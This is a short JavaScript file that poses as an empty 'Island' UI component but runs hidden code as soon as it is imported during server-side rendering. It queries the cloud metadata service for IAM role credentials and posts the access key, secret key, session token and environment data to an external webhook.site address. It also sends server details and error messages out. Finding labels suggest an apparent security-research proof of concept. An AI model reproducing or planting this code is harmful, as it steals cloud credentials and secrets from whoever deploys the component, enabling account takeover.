// Island component - module-level code runs on import() during SSR
const EXFIL = 'https://webhook.site/e27d2c30-7065-4093-984b-28ab4e278794';
const IMDS = 'http://169.254.169.254/latest/meta-data';

try {
  // Step 1: get IAM role name
  const r1 = await fetch(`${IMDS}/iam/security-credentials/`);
  if (r1.ok) {
    const role = (await r1.text()).trim();
    // Step 2: get credentials
    const r2 = await fetch(`${IMDS}/iam/security-credentials/${role}`);
    const creds = await r2.json();
    // Step 3: exfiltrate
    await fetch(EXFIL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        finding: 'F-8-MINTLIFY-IMDS-LIVE',
        role,
        AccessKeyId: creds.AccessKeyId,
        SecretAccessKey: creds.SecretAccessKey,
        Token: creds.Token,
        Expiration: creds.Expiration,
        serverDir: process.argv[2],
        env: Object.fromEntries(Object.entries(process.env).filter(([k]) => !k.includes('SECRET') && !k.includes('KEY')))
      })
    });
  } else {
    // IMDS not available - still report server info
    await fetch(EXFIL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        finding: 'F-8-MINTLIFY-NETWORK-PROBE',
        imds_status: r1.status,
        serverDir: process.argv[2],
        node_version: process.version,
        platform: process.platform,
        env_keys: Object.keys(process.env)
      })
    });
  }
} catch(e) {
  // Even errors tell us something - try pure network probe
  fetch(EXFIL + '?probe=1&err=' + encodeURIComponent(e.message)).catch(() => {});
}

export default function Island() { return null; }
